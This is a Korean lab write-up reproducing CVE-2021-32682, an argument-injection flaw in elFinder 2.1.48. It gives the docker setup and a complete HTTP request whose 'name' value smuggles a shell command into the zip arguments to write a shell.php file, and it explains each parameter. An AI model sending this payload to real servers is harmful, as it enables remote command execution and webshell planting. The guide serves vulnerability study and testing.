elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682)

elFinder는 JavaScript와 jQuery UI를 사용하여 작성된 오픈 소스 웹 파일 관리자입니다.

elFinder 2.1.48 및 그 이전 버전에서 인수 주입 취약점이 발견되었습니다. 이 취약점을 통해 공격자는 elFinder PHP 커넥터를 호스팅하는 서버에서 최소한의 구성으로도 임의의 명령을 실행할 수 있습니다. 이 문제는 버전 2.1.59에서 패치되었습니다. 해결책으로는 커넥터가 인증 없이 노출되지 않도록 하는 것이 있습니다.

참고:

https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt
https://xz.aliyun.com/t/10739
취약성 환경
다음 명령을 실행하여 elFinder 2.1.48을 시작합니다.

docker compose up -d
서버가 시작되면 elFinder의 메인 페이지를 http://your-ip:8080에서 볼 수 있습니다.

취약성 재현
먼저 이 취약점을 재현하기 위해 2개의 파일을 준비해야 합니다.

1.txt라는 일반 텍스트 파일을 생성합니다.

이 파일을 마우스 오른쪽 버튼을 클릭하여 ZIP 형식으로 압축하고 이 압축된 파일 이름을 2.zip으로 변경합니다.

1.txt 및 2.zip 파일을 준비합니다.

그런 다음 다음 요청을 보내서 임의의 명령을 실행합니다.

GET /php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php%20%23%20a.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip HTTP/1.1
Host: your-ip
Accept: application/json, text/javascript, /; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://localhost.lan:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US, en; q=0.9, zh-CN; q=0.8, zh; q=0.7
Connection: close

이 요청에서 3가지 중요한 매개변수를 볼 수 있습니다.

name은 -TvTT=id>shell.php # a.zip와 같이 설정되어 있으며, id>shell.php를 임의의 명령으로 수정할 수 있습니다.
targets[0]는 l1_MS50eHQ와 같이 설정되어 있으며, l1은 첫 번째 저장 볼륨을 나타내며 MS50eHQ는 1.txt의 Base64 인코딩 된 문자열입니다.
targets[1]은 l1_Mi56aXA와 같이 설정되어 있으며, l1은 첫 번째 저장 볼륨을 나타내며 Mi56aXA는 2.zip의 Base64 인코딩 된 문자열입니다.
이 요청은 오류 메시지를 반환하더라도 명령이 실행되고 shell.php가 http://your-ip:8080/files/shell.php로 작성된 것을 볼 수 있습니다.
